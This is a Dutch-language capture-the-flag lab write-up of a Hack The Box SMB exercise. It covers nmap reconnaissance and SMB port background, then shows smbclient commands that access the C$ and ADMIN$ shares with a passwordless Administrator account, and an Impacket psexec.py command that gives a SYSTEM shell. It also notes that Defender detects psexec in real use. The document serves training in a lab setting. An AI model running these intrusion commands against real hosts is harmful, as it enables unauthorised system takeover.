---
title: 'HTB Tactics - Basic SMB exploitation'
cover: ../images/covers/h4ckronin.png
date: 2023-03-15T11:00:00-07:00
lastmod: 2023-03-15T11:00:00-07:00
---

## Verkeerd geconfigureerde SMB-shares

Windows is het meest gebruikte besturingssysteem ter wereld, zowel thuis als op kantoor. Veel bedrijven kiezen voor Windows vanwege de gemakkelijke bestandsopslag en het gebruiksvriendelijke ontwerp. Ze vullen hun netwerken met Windows-servers en -computers. Hoewel Windows makkelijk is voor dagelijks gebruik, is het moeilijk om het goed te beveiligen. Vooral voor onervaren systeembeheerders is het een uitdaging om Windows veilig te maken en alle mogelijke zwakke plekken te vinden en te verhelpen.

In dit voorbeeld kijken we naar een SMB-share die niet goed is ingesteld. Dit geeft ons twee manieren om binnen te komen. De eerste manier is vrij simpel. De tweede manier heeft speciale software nodig en is lastiger. Omdat de tweede manier minder vaak wordt gebruikt en moeilijker is, moet je in het echt goed nadenken welke manier je kiest.

---

**Laten we eerst kijken of de host actief is:**

```bash
#Bekijk ons huidige ip adres
ip a s

#Test of de target actief is
ping -c3 {target ip}
```

### MITRE ATT&CK

- **Tactic 1**: **Reconnaissance (TA0043)**
- **Technique**: **ICMP Scan (T1005)**

![De host is actief](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/624d7d6f-6102-4e3b-9ff9-ff1c0a522b02/image.png)

De host is actief

<aside>
💡

ipv6 gebruik ping6 in plaats van ping

</aside>

Ping-proces in het OSI-model: Van zender naar ontvanger

````bash
Applicatielaag (L7) → Netwerklaag (L3) → Datalinklaag (L2) → Fysieke laag (L1)
(Ping Commando)       (ICMP Echo Request)   (Ethernet Frame)    (Signalen via Netwerk)
````

Ping-proces in het OSI-model: Van ontvanger naar zender

```bash
Fysieke laag (L1) → Datalinklaag (L2) → Netwerklaag (L3) → Datalinklaag (L2) → Fysieke laag (L1)
(Ontvangt Request)   (Verwerkt Frame)     (ICMP Request)        (Echo Reply)      (Signalen Terug)
```

Ping-proces in het OSI-model: Resultaat

```bash
Fysieke laag (L1) → Datalinklaag (L2) → Netwerklaag (L3) → Applicatielaag (L7)
(Ontvangt Reply)    (Ethernet Frame)    (ICMP Echo Reply)   (Resultaat in Terminal)
```

---

## Enumeration

We voeren een standaard nmap-scan uit om de host te vinden. Deze scan gebruikt verschillende methoden:

- ARP-verzoeken voor lokale netwerken
- ICMP Echo Requests (gewone pings)
- TCP-verbindingspogingen
- UDP-pings

Door deze methoden te combineren, kunnen we actieve hosts ontdekken, zelfs als firewalls bepaalde pings blokkeren. Dit helpt ons ook om netwerkbeveiliging te identificeren die specifiek verkeer tegenhoudt.

```bash
#Ping de target en kijk of hij een firewall heeft
nmap -sn {target}
```

### MITRE ATT&CK

- **Tactic 7**: **Discovery (TA0007)**
- **Technique**: **Network Scanning (T1046)**

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/bf899ad6-ee7e-4d21-9b72-82bd104e174b/image.png)

<aside>
🔥

De scan toont aan dat er een firewall actief is.

</aside>

In de praktijk hebben we vrijwel altijd te maken met firewalls. Deze blokkeren veel scans en verzoeken van tools zoals nmap. ICMP is vaak gebruikt om een host te pingen en wordt door nmap aan het begin van een scan ingezet. De ***-Pn*** parameter zorgt ervoor dat de nmap-scan de host discovery-fase overslaat. Hierbij worden alle hosts als actief beschouwd, waarna verschillende pogingen worden ondernomen om actief te port-scannen en ook de versienummers van de services te verkrijgen.

```bash
-Pn : Skipt host-discovery (Skipt ICMP pings) en ziet alle hosts als actief.
-sC : * Voert alle default scripts uit, --script=default en enumereert services

* Zie default scripts in https://nmap.org/nsedoc/categories/default.html
```

---

**Om te weten of onze huidige attack surface uitgebreid kan worden doen we een nmap script scan zonder ICMP:**

```bash
sudo nmap -sC -Pn {target ip}
```

### MITRE ATT&CK

- **Tactic 7**: **Discovery (TA0007)**
- **Technique**: **Service Scanning (T1046)**

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/7dbed126-2583-43e4-af55-ee94bec85fc9/image.png)

### De -sC optie

- **Service version detection**: Welke versies van services draaien er op de doelhost?
- **Vulnerability scanning**: Zijn er bekende kwetsbaarheden in de aanwezige services?
- **OS detection**: Welk besturingssysteem draait er op de doelhost?

<aside>
📝

De resultaten tonen dat poort 445 voor Server Message Block (SMB) open staat. Het is essentieel om deze en andere open poorten zorgvuldig te documenteren en te analyseren voordat we verdere acties ondernemen.

</aside>

### **Poort 135: RPC (Remote Procedure Call)**

**Wat het doet**: Faciliteert communicatie tussen Windows-toepassingen.

- **Functie**: Verzorgt communicatie tussen client- en serverprocessen in Windows, actief in **svchost.exe**.
- **Voordelen**: Cruciaal voor Windows-applicaties en technologieën zoals COM/DCOM.
- **Nadelen**: Potentieel doelwit voor aanvallen; **svchost.exe** mag niet worden afgesloten

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/595f4908-a49b-4456-92ea-d82d28a31853/image.png)

### **Poort 139: NetBIOS** (Network Basic Input/Output System)

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/223f914f-90bb-4198-a1b2-a33e6aafb66b/image.png)

**Wat het doet**: Verzorgt communicatie voor bestands- en printerdeling binnen een lokaal netwerk (LAN).

- **Functie**: Maakt bestandsdeling mogelijk via de **sessielaag** in een LAN.
- **Voordelen**: Vereenvoudigt communicatie in lokale netwerken. ***SMB kan lokaal worden gebruikt***
- **Nadelen**: Verouderd en kwetsbaar voor aanvallen, vaak overbodig in moderne netwerken waar het over TCP/IP (NBT) gaat, maar soms op wat oudere netwerken te zien over IEEE 802.2 and IPX/SPX (NBX).

### **Poort 445: SMB (Server Message Block)**

**Wat het doet**: Protocol voor netwerkbestandsdeling, ook via internet.

- **Functie**: Faciliteert bestands- en printerdeling via **TCP/IP**. ***SMB kan hier over het internet worden gebruikt***
- **Voordelen**: Ondersteunt bestandsdeling via IP-adressen, functioneert ook over internet.
- **Nadelen**: Vaak doelwit voor aanvallen zoals ransomware, kan netwerkprestaties beïnvloeden.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/a78fbda5-213b-44c0-9b95-bf31a85d24c0/image.png)

![SMB in het OSI model en TCP/IP model](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/f649fb9d-67f3-4127-87a5-b0f21e9a9668/image.png)

SMB in het OSI model en TCP/IP model

SMB (Server Message Block) is oorspronkelijk een bestandsdeelprotocol, wat betekent dat het mogelijk waardevolle informatie kan onthullen bij nadere verkenning. Je kunt dit doen met de **smbclient** tool. Deze tool is standaard geïnstalleerd op het Parrot OS dat Pwnbox gebruikt. 

Is smbclient niet geïnstalleerd op je VM? Geen zorgen! Je kunt het eenvoudig toevoegen met dit commando:

```bash
sudo apt install smbclient
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/7bebe104-9e1b-4fdc-9d71-aa27a1dedb8d/image.png)

Laten we nu de opties van smbclient bekijken:

```bash
smbclient --help
```

![In het kort de mogelijkheden van smbclient](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/22aeea04-943f-41b5-a130-f1a2462033b7/image.png)

In het kort de mogelijkheden van smbclient

Schrik niet van alle opties die smbclient heeft, want voor nu zijn deze twee opties het meest belangrijk:

```bash
-L : List beschikbare shares op het doel.
-U : Inloggegevens die gebruikt moeten worden.
```

### MITRE ATT&CK

- **Tactic 7**: **Discovery (TA0007)**
- **Technique**: **Network Share Discovery (T1135)**

```bash
smbclient -L {target_IP} -U Administrator
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/174d9438-fdf9-4f65-a89e-7ed2959ddc04/f89eeb3c-5b27-4307-b4f2-0ae98ff87320/image.png)

---

# Foothold - SMB Onbeveiligde C$ Share

We hebben twee opties om toegang te krijgen. De eerste is opvallend en simpel, de tweede iets complexer. Bij de opvallende methode gebruiken we **Smbclient** om direct de C$-share te benaderen met beheerdersrechten. De tweede aanpak gebruikt [**PSexec.py**](http://psexec.py/) van Impacket. Hiervoor moet Impacket geïnstalleerd zijn. Deze methode toont veel voorkomende zwakke plekken en helpt bij het in kaart brengen van het systeem.

## Optie A: Eenvoudig - smbclient

```bash
smbclient \\\\10.10.10.131\\ADMIN$ -U Administrator
smb: \> help

smbclient \\\\10.10.10.131\\C$ -U Administrator
smb: \> dir
smb: \> cd Users\Administrator\Desktop

smb: \Users\Administrator\Desktop\> dir
smb: \Users\Administrator\Desktop\> get flag.txt
smb: \Users\Administrator\Desktop\> exit 
```

## Optie B: Geavanceerd - Impacket

---

[psexec.py](http://psexec.py/), een tool uit Impacket, biedt meer systeemcontrole. Het voert opdrachten uit op externe computers door een nieuwe Windows-service aan te maken via poort 445.

Beheerdersrechten zijn vereist voor psexec. Succesvolle inlog geeft volledige systeemcontrole (NT AUTHORITY\SYSTEM).

Impacket installeren:

1. Installeer Python3 en pip3: 
    
    ```bash
    sudo apt install python3 python3-pip
    ```
    
2. Download Impacket van de officiële bron
    
    ```bash
    git clone https://github.com/SecureAuthCorp/impacket.git
    cd impacket
    pip3 install .
    # OR:
    sudo python3 setup.py install
    # In case you are missing some modules:
    pip3 install -r requirements.txt
    ```
    
3. Vind psexec in /impacket/examples/psexec.py
4. Voor hulp, voer uit: [psexec.py](http://psexec.py/) -h

Om een interactieve shell van het doelsysteem te krijgen, gebruik je deze opdracht:

```bash
python psexec.py gebruikersnaam:wachtwoord@{target-IP}
```

We weten uit onze eerdere smbclient-methode dat de 'Administrator'-gebruiker geen wachtwoord heeft. Daarom gebruiken we deze opdracht:

```bash
psexec.py Administrator@{target-IP}
```

Als er om een wachtwoord wordt gevraagd, druk je gewoon op Enter.

Dit geeft ons toegang met de hoogste rechten (NT Authority/System). Van hieruit kun je door het bestandssysteem navigeren en de vlag ophalen.

> Let op: hoewel psexec goed werkt in testsituaties, wordt het in echte situaties gemakkelijk opgemerkt door Windows Defender. Voor echte testen zijn mogelijk andere methoden nodig.
>
